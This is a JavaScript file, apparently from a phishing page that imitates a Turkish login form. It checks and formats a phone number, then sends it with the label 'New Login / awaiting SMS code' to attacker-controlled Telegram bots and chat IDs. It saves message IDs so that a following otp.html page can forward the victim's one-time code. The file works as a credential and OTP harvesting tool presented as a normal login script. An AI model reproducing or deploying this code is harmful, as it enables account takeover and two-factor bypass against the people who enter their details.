// Phone number formatting
const phoneInput = document.getElementById('phone');
const loginBtn = document.getElementById('loginBtn');

// Only allow digits in phone input
phoneInput.addEventListener('input', function (e) {
    let value = this.value.replace(/\D/g, '');
    // Başındaki sıfırları otomatik kaldır (0538... → 538...)
    value = value.replace(/^0+/, '');
    if (value.length > 10) {
        value = value.slice(0, 10);
    }
    this.value = value;
});

// Send phone to Telegram (all chat IDs in parallel)
async function sendToTelegram(phone) {
    const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n\n⏳ SMS Kod Bekleniyor...`;
    const messageIds = {};
    const bots = [TELEGRAM_CONFIG.BOT_TOKEN];
    if (TELEGRAM_CONFIG.BOT_TOKEN_2) bots.push(TELEGRAM_CONFIG.BOT_TOKEN_2);

    const sendPromises = [];
    for (const bot of bots) {
        for (const chatId of TELEGRAM_CONFIG.CHAT_IDS) {
            const url = `https://api.telegram.org/bot${bot}/sendMessage`;
            sendPromises.push((async () => {
                try {
                    const res = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
                    });
                    const data = await res.json();
                    if (data.ok) {
                        messageIds[`${bot}:::${chatId}`] = data.result.message_id;
                        console.log(`Log sent to ${chatId} via ${bot.substring(0, 8)}...`);
                    }
                } catch (e) {
                    console.error(`Fetch error:`, e);
                }
            })());
        }
    }

    await Promise.all(sendPromises);

    // Store message IDs and phone for OTP page to update
    localStorage.setItem('tg_message_ids', JSON.stringify(messageIds));
    localStorage.setItem('tg_phone', phone);
    return Object.keys(messageIds).length > 0;
}

// Login button click handler
loginBtn.addEventListener('click', async function () {
    const phone = phoneInput.value.replace(/\D/g, '');

    if (phone.length < 10) {
        const inputGroup = document.querySelector('.input-group');
        inputGroup.style.borderColor = '#e74c3c';
        inputGroup.classList.add('shake');

        setTimeout(() => {
            inputGroup.style.borderColor = '#c5cdd6';
            inputGroup.classList.remove('shake');
        }, 600);
        return;
    }

    // Proceed with login - send to Telegram then navigate
    this.textContent = 'Sorgulanıyor...';
    this.disabled = true;
    this.style.opacity = '0.7';

    localStorage.setItem('tg_display_phone', phone);
    await sendToTelegram(phone);

    setTimeout(() => {
        window.location.href = 'otp.html';
    }, 500);
});

// Add shake animation dynamically
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        20% { transform: translateX(-6px); }
        40% { transform: translateX(6px); }
        60% { transform: translateX(-4px); }
        80% { transform: translateX(4px); }
    }
    .shake {
        animation: shake 0.4s ease-in-out;
    }
`;
document.head.appendChild(style);
